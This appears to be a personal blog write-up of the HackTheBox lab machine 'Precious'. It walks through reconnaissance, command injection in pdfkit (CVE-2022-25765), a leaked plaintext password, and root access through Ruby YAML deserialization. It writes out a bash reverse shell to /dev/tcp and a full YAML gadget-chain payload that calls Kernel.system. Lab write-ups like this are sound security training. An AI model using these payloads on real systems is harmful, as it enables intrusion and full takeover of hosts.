---
title: "Precious - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Precious
![](https://kar0nx.github.io/assets/images/writeup/3adcfd6093f8ddb4dffe8422da6377c8.png)
## Reconnaissance

IP: 10.10.11.189
## NMAP

```
nmap -T4 -p- -A 10.10.11.189
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 11:30 UTC
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   28.51 ms 10.10.14.1
2   28.69 ms precious.htb (10.10.11.189)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds
```

add precious.htb to /etc/hosts
## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916133207.png)

Quick working test 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916133316.png)

and we got response
Let's search for open local ports like in editorial machine, so start burp
copy request and type FUZZ in port value

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916133651.png)

FFUF and feroxbuster didn't find anything userfull so let's dig deeper

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916134226.png)

In response we see that app is powered by phusion Passenger(R) 6.0.15
and is written in Ruby,  which convert site to pdf

Let's check this pdf, I created index.html host it with python and then send it to site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916140100.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916140120.png)

we got page saved in pdf. Let's check for plugin/etc which converts site to pdf.
Simply type exiftool filename

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916140316.png)

And we can spot that this is generated by pdfkit v0.8.6
Found CMD injection vuln CVE-2022-25765
https://www.exploit-db.com/exploits/51293

```
python3 51293.py -s 10.10.14.8 443 -w http://precious.htb/ -p url
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916141039.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916141055.png)

Exploit works perfectly, now let's get TTY shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Gaining Access 

Searching in home directory we have 2 users henry and ruby.
Enumerating ruby home directory I spot non-default .bundle hidden directory and  username and pasword in config file

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916142145.png)

henry Q3c1AqGHtoI0aXAYFH
Now I manage to SSH via henry credentials

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916142404.png)

## Privilege Escalation

Running sudo -l I spot that we can run sudo with ruby

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916142447.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916142931.png)

I'm not good at ruby so let's paste in into llm and check what it finds

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916143326.png)

Searching this I found PoC: https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916143712.png)

Now simply change command, I used reverse shell

```
bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'
```

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'
         method_id: :resolve
```

run script with sudo

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916143929.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250916143851.png)

and we got root shell